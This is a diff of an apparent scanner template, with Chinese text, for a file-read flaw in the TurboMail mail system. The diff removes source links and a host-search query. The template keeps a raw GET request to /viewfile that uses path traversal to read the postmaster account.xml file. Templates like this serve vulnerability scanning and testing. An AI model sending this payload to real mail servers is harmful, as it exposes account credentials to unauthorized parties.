@@ -3,14 +3,8 @@ info:
   name: TurboMail邮件系统viewfile文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/42adb3cf6dcabe1509e282fb5d489201
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 42adb3cf6dcabe1509e282fb5d489201
-    fofa: + hunter`web.body="maintlogin.jsp" && web.body="/mailmain?type=logout"`
 http:
 - raw:
   - 'GET /viewfile?type=cardpic&mbid=1&msgid=2&logtype=3&view=true&cardid=/accounts/root/postmaster&cardclass=../&filename=/account.xml HTTP/1.1
